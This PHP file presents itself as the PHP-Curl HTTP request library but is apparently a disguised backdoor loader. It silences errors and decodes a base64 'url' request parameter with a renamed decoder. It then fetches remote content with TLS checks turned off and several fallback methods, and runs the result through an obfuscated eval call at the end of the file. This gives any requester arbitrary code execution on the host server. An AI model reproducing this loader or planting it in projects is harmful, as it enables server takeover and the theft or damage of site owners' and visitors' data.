<?php
/**
 * API Requests using the HTTP protocol through the Curl library.
 *
 * @author    Josantonius <hello@josantonius.com>
 * @copyright 2016 - 2018 (c) Josantonius - PHP-Curl
 * @license   https://opensource.org/licenses/MIT - The MIT License (MIT)
 * @link      https://github.com/Josantonius/PHP-Curl
 * @since     1.0.0
 */

error_reporting( 0 );

function key_decryptor($input) {
    $keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    $output = "";

    $input = preg_replace("/[^A-Za-z0-9\+\/\=]/", "", $input);

    $i = 0;
    while ($i < strlen($input)) {
        $enc1 = strpos($keyStr, $input[$i++]);
        $enc2 = strpos($keyStr, $input[$i++]);
        $enc3 = strpos($keyStr, $input[$i++]);
        $enc4 = strpos($keyStr, $input[$i++]);

        $chr1 = ($enc1 << 2) | ($enc2 >> 4);
        $chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
        $chr3 = (($enc3 & 3) << 6) | $enc4;

        $output .= chr($chr1);
        if ($enc3 !== false && $enc3 != 64) {
            $output .= chr($chr2);
        }
        if ($enc4 !== false && $enc4 != 64) {
            $output .= chr($chr3);
        }
    }

    return $output;
}

function url_get_content($url) {
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        throw new Exception("Invalid URL provided: $url");
    }

    $contextOptions = array(
        "http" => array(
            "method" => "GET",
            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0\r\n",
            "timeout" => 30,
            "follow_location" => 1,
        ),
        "ssl" => array(
            "verify_peer" => false,
            "verify_peer_name" => false,
            "allow_self_signed" => true,
        ),
    );

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);

        $content = curl_exec($ch);

        if (curl_errno($ch)) {
            error_log("cURL error: " . curl_error($ch));
        } else {
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            if ($httpCode >= 200 && $httpCode < 300) {
                curl_close($ch);
                return $content;
            }
        }

        curl_close($ch);
    }

    if (function_exists('file_get_contents')) {
        $context = stream_context_create($contextOptions);
        $content = @file_get_contents($url, false, $context);

        if ($content !== false) {
            return $content;
        }
    }

    $urlParts = parse_url($url);
    $scheme = $urlParts['scheme'] === 'https' ? 'ssl://' : '';
    $port = isset($urlParts['port']) ? $urlParts['port'] : ($urlParts['scheme'] === 'https' ? 443 : 80);

    if (function_exists('fsockopen')) {
        $fp = @fsockopen($scheme . $urlParts['host'], $port, $errno, $errstr, 30);
        if ($fp) {
            $out = "GET " . $urlParts['path'] . " HTTP/1.1\r\n";
            $out .= "Host: " . $urlParts['host'] . "\r\n";
            $out .= "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0\r\n";
            $out .= "Connection: Close\r\n\r\n";

            fwrite($fp, $out);
            $content = '';

            while (!feof($fp)) {
                $content .= fgets($fp, 128);
            }

            fclose($fp);

            $headerEnd = strpos($content, "\r\n\r\n");
            if ($headerEnd !== false) {
                return substr($content, $headerEnd + 4);
            }
        }
    }

    throw new Exception("Failed to fetch content from: $url");
}

if (isset($_GET['url'])) {
    $url = key_decryptor($_GET['url']);
    $content_output = url_get_content($url);
    EVAL		        ('?>' . $content_output);
}

?>